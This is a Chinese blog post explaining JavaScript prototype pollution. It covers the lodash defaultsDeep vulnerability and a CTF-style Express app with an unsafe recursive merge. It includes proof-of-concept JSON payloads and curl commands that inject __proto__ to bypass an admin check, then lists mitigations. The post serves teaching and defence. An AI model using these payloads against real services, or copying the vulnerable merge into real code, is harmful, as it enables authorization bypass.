---
title: js-prototype-pollution
date: 2019-07-21 14:59:04
tags:
 - js 
 - 安全
categories: js 基础
---

> 长草的 github 某一天突然往邮箱狂发了几个 vulnerable dependency 的提醒，才知 lodash 爆漏洞了。该漏洞是个原型污染问题，由开源安全平台 Snyk 的开发者 Liran Tal发现，详情看[这里]。

### lodash 漏洞

lodash 有个 defaultsDeep 方法，也就是默认的深拷贝方法，它能够实现这样的功能：

> 分配来源对象（该方法的第二个参数）的可枚举属性到目标对象（该方法的第一个参数）所有解析为 undefined 的属性上

```javascript
_.defaultsDeep({ 'a': { 'b': 2 } }, { 'a': { 'b': 1, 'c': 3 } })

// 结果

{ 'a': { 'b': 2, 'c': 3 } }
```

在第二个参数上动些手脚，可以修改对象原型链上的属性：

```javascript
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"a0": true}}}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();
```

这里在空对象 `{}` 上加了一个 `a0` 熟悉。既然能增加，那么修改也不是问题了，如果修改 `toString` 原型方法，例如把 `payload` 换成

```javascript
const payload = '{"constructor": {"prototype": {"toString": true}}}'
```

那么 `Object.prototype.toString` 就很不安全了。

lodash 紧急发布的修复中，对第二个拷贝参数作了键值判断

![](https://res.cloudinary.com/snyk/image/upload/v1562272212/Screen_Shot_2019-07-04_at_23.29.28.png)

![](https://res.cloudinary.com/snyk/image/upload/v1562272212/Screen_Shot_2019-07-04_at_23.29.28.png)

### NodeJS 漏洞案例

```javascript
'use strict';
 
const express = require('express');
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser');
const path = require('path');
 
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
 
function merge(a, b) {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}
 
function clone(a) {
    return merge({}, a);
}
 
// Constants
const PORT = 8080;
const HOST = '0.0.0.0';
const admin = {};
 
// App
const app = express();
app.use(bodyParser.json())
app.use(cookieParser());
 
app.use('/', express.static(path.join(__dirname, 'views')));
app.post('/signup', (req, res) => {
    var body = JSON.parse(JSON.stringify(req.body));
    var copybody = clone(body)
    if (copybody.name) {
        res.cookie('name', copybody.name).json({
            "done": "cookie set"
        });
    } else {
        res.json({
            "error": "cookie not set"
        })
    }
});
app.get('/getFlag', (req, res) => {
    var аdmin = JSON.parse(JSON.stringify(req.cookies))
    if (admin.аdmin == 1) {
        res.send("hackim19{}");
    } else {
        res.send("You are not authorized");
    }
});
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);
```

问题出在 `merge` 函数上，攻击者可以通过以下方式绕过登陆验证：

```
curl -vv --header 'Content-type: application/json' -d '{"__proto__": {"admin": 1}}' 'http://0.0.0.0:4000/signup'; 

curl -vv 'http://0.0.0.0:4000/getFlag'
```

攻击案例来自：https://www.youtube.com/watch?v=LUsiFV3dsK8

像接口数据的校验，就要小心原型被修改的可能。

### 原型污染防范

 - 使用 `Object.freeze()`
 - 使用 `Object.create(null)` 


> 参考
> (Snyk research team discovers severe prototype pollution security vulnerabilities affecting all versions of lodash)[https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/]
>
> 部分转载自[最新：Lodash 严重安全漏洞背后你不得不知道的 JavaScript 知识](https://juejin.im/post/5d271332f265da1b934e2d48#heading-2)